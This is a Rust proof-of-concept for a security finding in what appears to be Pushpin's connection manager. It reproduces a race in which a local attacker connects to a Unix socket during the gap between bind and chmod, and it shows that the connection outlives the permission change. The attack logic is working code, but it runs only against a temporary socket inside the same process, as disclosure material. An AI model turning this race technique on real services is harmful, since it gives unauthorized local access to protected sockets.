// PoC for finding 001: src/connmgr/server.rs:2001 binds a Unix listener and
// only afterwards applies fs::set_permissions / set_user / set_group. A local
// attacker that wins the race during the bind <-> chmod window can connect to
// the socket while it is still world-accessible. The accepted connection is
// preserved across the chmod (Unix permissions gate future connect(2) calls,
// not already-queued ones).
//
// This PoC mirrors the exact sequence of std calls used by Server::new, then
// races a client against the chmod and reads from the accepted FD afterwards.

use std::fs;
use std::io::{Read, Write};
use std::os::unix::fs::PermissionsExt;
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::PathBuf;
use std::sync::mpsc::channel;
use std::thread;
use std::time::Duration;

fn main() {
    let path: PathBuf = std::env::temp_dir().join("pushpin-poc-001.sock");
    let _ = fs::remove_file(&path);

    // Match the vulnerable umask environment. Server::new doesn't restrict
    // umask before the bind; a process started with permissive umask leaves
    // the socket world-rw at creation.
    unsafe { libc::umask(0o000) };

    let (ready_tx, ready_rx) = channel::<()>();
    let (race_tx, race_rx) = channel::<UnixStream>();

    // Attacker thread: spins on connect(2) the moment the socket appears.
    // This represents a low-privilege local process racing the chmod window.
    let race_path = path.clone();
    let attacker = thread::spawn(move || {
        ready_rx.recv().unwrap();
        loop {
            match UnixStream::connect(&race_path) {
                Ok(s) => {
                    race_tx.send(s).unwrap();
                    return;
                }
                Err(_) => thread::sleep(Duration::from_micros(10)),
            }
        }
    });

    // Server-side: this is the exact pattern in Server::new at
    // src/connmgr/server.rs:2001 -- bind first, set perms after.
    let l = UnixListener::bind(&path).expect("bind");

    // Snapshot the post-bind permission, identical to what an unprivileged
    // attacker observes via stat(2).
    let post_bind_mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;

    // Wake the attacker so it starts hammering connect(2).
    ready_tx.send(()).unwrap();

    // Give the attacker a brief window, then apply the configured restrictive
    // mode. This mirrors fs::set_permissions(path, Permissions::from_mode(0)).
    thread::sleep(Duration::from_millis(20));
    fs::set_permissions(&path, fs::Permissions::from_mode(0o000)).unwrap();

    let post_chmod_mode = fs::metadata(&path).unwrap().permissions().mode() & 0o777;

    // The attacker's already-accepted connection survives the chmod. Server
    // calls accept() and processes the stream through Listener::run.
    let (mut server, _peer) = l.accept().expect("accept");
    let attacker_stream = race_rx.recv_timeout(Duration::from_secs(2)).unwrap();

    server.write_all(b"served\n").unwrap();
    drop(server);

    let mut buf = String::new();
    let mut a = attacker_stream;
    a.read_to_string(&mut buf).unwrap();

    // Confirm a fresh connect after the chmod is rejected -- this proves the
    // restrictive mode is in effect *now*, yet the queued raced connection
    // was still accepted.
    let post_chmod_attempt = UnixStream::connect(&path);

    println!("post-bind mode  : 0o{:03o}", post_bind_mode);
    println!("post-chmod mode : 0o{:03o}", post_chmod_mode);
    println!(
        "post-chmod connect: {}",
        match &post_chmod_attempt {
            Ok(_) => "UNEXPECTEDLY succeeded".into(),
            Err(e) => format!("rejected ({})", e.kind()),
        }
    );
    println!("attacker received: {:?}", buf);

    attacker.join().unwrap();

    let raced =
        post_bind_mode == 0o777 && post_chmod_mode == 0o000 && buf == "served\n"
            && post_chmod_attempt.is_err();

    if raced {
        println!("\nRESULT: vulnerable. Bind-before-chmod race won; chmod did not");
        println!("        revoke the already-accepted attacker connection.");
        std::process::exit(0);
    } else {
        println!("\nRESULT: race did not reproduce on this run");
        std::process::exit(1);
    }

    // Cleanup intentionally omitted in error paths so the artifact path is
    // observable; on success the OS removes it on next run via remove_file.
}

extern crate libc;
